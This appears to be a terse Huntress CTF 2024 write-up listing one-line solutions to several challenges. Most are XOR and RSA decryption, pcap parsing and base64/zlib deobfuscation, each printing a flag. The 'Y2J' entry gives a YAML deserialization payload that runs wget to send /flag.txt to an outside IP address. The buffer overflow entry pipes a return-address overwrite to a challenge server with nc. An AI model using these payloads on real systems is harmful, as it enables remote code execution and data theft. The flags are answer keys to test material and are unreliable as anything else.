# Huntress CTF 2024!

**Y2J**

    !!python/object/apply:os.system ["wget [http://54.158.37.106:8000/](http://54.158.37.106:8000/)?`cat /flag.txt`"]

**GoCrackMe1**

    >>> encrypted_string = "0:71-44coc``3dg0cc3c`nf2cno0e24435f0n+" 
    >>> xor_key = 0x56 
    >>> decrypted_chars = [chr(ord(c) ^ xor_key) for c in encrypted_string] 
    >>> decrypted_string = ''.join(decrypted_chars) 
    >>> decrypted_string 
    'flag{bb59566e21f55e5680d589f3dbbec0f8}'

**Echo Chamber**

    >>> from scapy.all import * 
    >>> packets = rdpcap('../echo_chamber.pcap') 
    >>> rawlist = [] 
    >>> for i in packets: 
	... 	x = str(i[Raw].load) 
	... 	for k in range(5,8): 
	... 		if x[-k] == x[-8]: 
	... 			rawlist.append(x[-8])  
	>>> flag = "" 
	>>> new_rawlist = rawlist[::6] 
	>>> for letter in new_rawlist: 
	... 	flag += str(letter)

**Baby Buffer Overflow - 32bit**

    (echo -ne "AAAAAAAAAAAAAAAABBBBCCCCBBBB\xf5\x91\x04\x08"; cat) | nc challenge.ctf.games 30440


**Strive Marish Leadman TypeCDR**

    >>> p = 0xe74401dbb278dd97826cd025b01e35877912256cc3d85ba84c739c0d952bd6b08b0af5ee6dac87fb3a7e9b9b9d7c5be22213e5ff3807fa87627bd408e0f2da53 
    >>> q = 0xdabd2ed743e99869e8c4c171db9eee47d336659a59152903d39ddc09a81d56bff4dc75b488ca9c327368e4d4f48610421e6861d3c390d30d979740568247dee5 
    >>> d = 0xbdc326fc424eb9a2f0814d5ead0f7f40876bad0d71fe6230f89b5c562c0997dcdb76bb57fedfaf1288017c259c05bf71ab04e6152aa05599b7d8c0a4cd08ead9242e0e9074b384e7d4280863a58d08092cfc180151e8606a3b035ea7c49d79f9edfa23f255e968e05995c9a19d390b4cd6c868988e5e953713c3d8aff476a6c1 >>> e = 0x10001 
    >>> n = 0xc59ad11b24fa8c957830eed9ce87befbb2fe1928a3cb5d9e291decdf43e97f5bf11c5ef30ec5b5f219eb4178030a3b628b4d5abb91b55a14f22e1cd2453cea921b10eb2f7a41c388248bebc72d7012af97477d51481dd9e0131b6ef5a34a68880f222a2eab369b8bc3ed4e9df5db25c784becab53c7294fbcf752d1e8596463f 
    >>> ciphertext = 0x7779ecc4329280a221b53af51e42da43ccefcb769269354ea526e16b776c194dcfcfe26d83a8e3ae457d1013a4100ba2682b416e52f9faa3fd7c2a1b183149c7cf860f7c5516f9122426d20709746b116bd65bfb14ad00660436d57c001aba7857e9e59a1c6cb5983eee439bd3cb410e0e2594b995b363c3830e66482a0af39d 
    >>> plaintext = pow(ciphertext, d, n) 
    >>> plaintext_bytes = plaintext.to_bytes((plaintext.bit_length() + 7) // 8, 'big') 
    >>> print(plaintext_bytes.decode('utf-8')) 
    flag{cf614b15ac1dd461a2e48afdfe21b8e8}


**Obfuscation Station**

    >>> import base64 
    >>> import zlib 
    >>> b64_string = 'UzF19/UJV7BVUErLSUyvNk5NMTM3TU0zMDYxNjSxNDcyNjexTDY2SUu0NDRITDWpVQIA' 
    >>> decoded_data = base64.b64decode(b64_string) 
    >>> decompressed_data = zlib.decompress(decoded_data, -15) 
    >>> decompressed_text = decompressed_data.decode('ascii') 
    >>> print(decompressed_text) 
    $5GMLW = "flag{3ed675ef0343149723749c34fa910ae4}"

**Stack It**

    >>> unk_804A00E = [
    ...     0x53, 0x51, 0x51, 0x55, 0x52, 0x5E, 0x56, 0x07, 0x01, 0x04,
    ...     0x0D, 0x02, 0x00, 0x03, 0x56, 0x5B, 0x0F, 0x50, 0x07, 0x01,
    ...     0x53, 0x50, 0x0B, 0x50, 0x55, 0x00, 0x51, 0x5B, 0x01, 0x06,
    ...     0x53, 0x06
    ... ]
    >>> 
    >>> unk_804A02E = [
    ...     0x31, 0x65, 0x63, 0x66, 0x66, 0x38, 0x62, 0x65, 0x63, 0x65,
    ...     0x39, 0x34, 0x38, 0x36, 0x32, 0x38, 0x37, 0x64, 0x63, 0x37,
    ...     0x36, 0x35, 0x32, 0x31, 0x61, 0x38, 0x34, 0x62, 0x62, 0x37,
    ...     0x63, 0x30
    ... ]
    >>> 
    >>> result = [a ^ b for a, b in zip(unk_804A00E, unk_804A02E)]
    >>> flag = ''.join(chr(x) for x in result) + '}'
    >>> flag
    'b4234f4bba4685dc84d6ee9a48e9c106}'

